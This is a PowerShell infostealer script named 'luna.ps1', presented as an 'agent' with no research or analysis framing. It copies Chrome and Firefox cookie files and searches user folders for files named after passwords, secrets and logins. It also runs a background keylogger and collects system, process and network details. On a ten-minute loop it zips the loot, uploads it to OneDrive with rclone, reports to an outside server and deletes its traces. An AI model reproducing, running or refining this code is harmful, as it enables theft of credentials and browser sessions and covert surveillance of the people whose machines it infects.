# luna.ps1 - PowerShell Agent with Cookie, File Collection, Media Capture, and Keylogging

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$shotsDir = "$tempDir\shots"
$logPath = "$tempDir\log.json"
$metaPath = "$tempDir\meta.txt"
$zipPath = "$tempDir\bundle.zip"
$cookieDir = "$tempDir\cookies"
$fileDumpDir = "$tempDir\files"
$keylogPath = "$tempDir\keylog.txt"
$interval = 600  # 10 minutes per cycle

New-Item -ItemType Directory -Force -Path $tempDir, $shotsDir, $cookieDir, $fileDumpDir | Out-Null

Start-Transcript -Path "$tempDir\session.log" -Append
Write-Output "[*] Started at $(Get-Date)"

function Get-ChromeCookies {
    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    if (Test-Path $path) {
        Copy-Item $path "$cookieDir\chrome.sqlite" -Force
    }
}

function Get-FirefoxCookies {
    $profiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profiles) {
        Get-ChildItem -Directory $profiles | ForEach-Object {
            $cookieFile = "$($_.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                Copy-Item $cookieFile "$cookieDir\firefox_$($_.Name).sqlite" -Force
            }
        }
    }
}

function Scan-Files {
    $targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    $patterns = @("*pass*", "*haslo*", "*secret*", "*login*")
    $extensions = @("*.txt", "*.doc", "*.docx", "*.pdf")

    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            foreach ($pattern in $patterns) {
                Get-ChildItem -Path $dir -Recurse -Filter $ext -ErrorAction SilentlyContinue | Where-Object {
                    $_.Name -like $pattern
                } | ForEach-Object {
                    $dest = Join-Path $fileDumpDir $_.Name
                    Copy-Item $_.FullName $dest -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }
}

function Get-SystemReport {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cpu = Get-CimInstance Win32_Processor
        $net = Get-NetTCPConnection | Select-Object -First 20
        $procs = Get-Process | Sort CPU -Descending | Select Name, Id, CPU -First 20

        return [PSCustomObject]@{
            user = $env:USERNAME
            host = $env:COMPUTERNAME
            os = $os.Caption
            version = $os.Version
            arch = $env:PROCESSOR_ARCHITECTURE
            cpu = $cpu.Name
            timestamp = Get-Date -Format o
            processes = $procs
            net = $net
        }
    } catch {
        Write-Warning "System report failed: $_"
        return $null
    }
}

Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
    public class KeyLogger {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(Int32 vKey);
    }'

    $map = @{
        8 = "[Back]"
        13 = "[Enter]"
        32 = " "
        27 = "[Esc]"
        9 = "[Tab]"
    }

    $logPath = "$env:TEMP\luna\keylog.txt"
    while ($true) {
        for ($i = 1; $i -le 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                $char = try {
                    if ($map.ContainsKey($i)) { $map[$i] } else { [char]$i }
                } catch { "[?]" }
                Add-Content -Path $logPath -Value "$char "
            }
        }
        Start-Sleep -Milliseconds 50
    }
}
function Archive-And-Upload {
    try {
        $report = Get-SystemReport
        if ($report) {
            $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Force
        }

        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $user = $env:USERNAME
        $finalZip = "$tempDir\luna_$user" + "_$timestamp.zip"
        $meta = "$tempDir\info.txt"

        @"
System: $($report.user)@$($report.host)
Date: $timestamp
Files: $(Get-ChildItem "$fileDumpDir" -Recurse | Measure-Object).Count
Cookies: $(Get-ChildItem "$cookieDir" -Recurse | Measure-Object).Count
"@ | Set-Content -Path $meta

        Compress-Archive -Path @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath) -DestinationPath $finalZip -Force

        Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
    } catch {
        Write-Warning "Archiving or upload failed: $_"
    }
}

function Upload-To-OneDrive {
    param(
        [string]$ZipPath,
        [string]$UserName,
        [string]$Timestamp
    )

    $rcloneExe = "$PSScriptRoot\rclone.exe"
    $rcloneConf = "$PSScriptRoot\rclone.conf"
    $remoteFolder = "onedrive:luna_uploads/$UserName/$Timestamp/"

    if (!(Test-Path $rcloneExe) -or !(Test-Path $rcloneConf)) {
        Write-Warning "rclone or config missing"
        return
    }

    & "$rcloneExe" copy "$ZipPath" "$remoteFolder" --config "$rcloneConf" --create-empty-src-dirs --quiet

    if ($LASTEXITCODE -eq 0) {
        $link = "https://onedrive.live.com/?id=root&cid=yourCIDhere" # REPLACE with actual or fixed pattern
        Send-Telegram -text "Upload OK: $UserName at $Timestamp`n$link"
    } else {
        Send-Telegram -text "Upload FAILED: $UserName at $Timestamp"
    }
}

function Send-Telegram {
    param([string]$text)
    try {
        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body @{ text = $text } -ContentType "application/json"
    } catch {
        Write-Warning "Telegram send failed: $_"
    }
}

function Cleanup {
    try {
        Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Output "Temp cleaned"
    } catch {
        Write-Warning "Cleanup failed"
    }
}

# === MAIN LOOP ===

while ($true) {
    Get-ChromeCookies
    Get-FirefoxCookies
    Scan-Files
    Archive-And-Upload
    Cleanup
    Start-Sleep -Seconds $interval
}

Stop-Transcript
